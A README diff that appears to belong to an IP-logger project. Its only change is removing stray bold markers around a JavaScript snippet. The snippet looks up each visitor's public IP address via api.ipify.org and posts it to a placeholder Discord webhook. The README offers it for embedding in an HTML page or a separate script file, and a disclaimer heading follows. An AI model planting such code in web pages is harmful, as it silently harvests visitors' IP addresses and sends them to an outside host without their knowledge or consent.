@@ -32,7 +32,7 @@ If you want to implement it in the html file directly use:**
 or use a seperate JavaScript file:
 
 ```js
-**fetch('https://api.ipify.org')
+fetch('https://api.ipify.org')
   .then(response => response.text())
   .then(ip => {
     fetch('YOUR_DISCORD_WEBHOOK', {
@@ -40,7 +40,7 @@ or use a seperate JavaScript file:
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ content: ip })
     });
-  })**
+  })
 ```
 
 ## Disclaimer
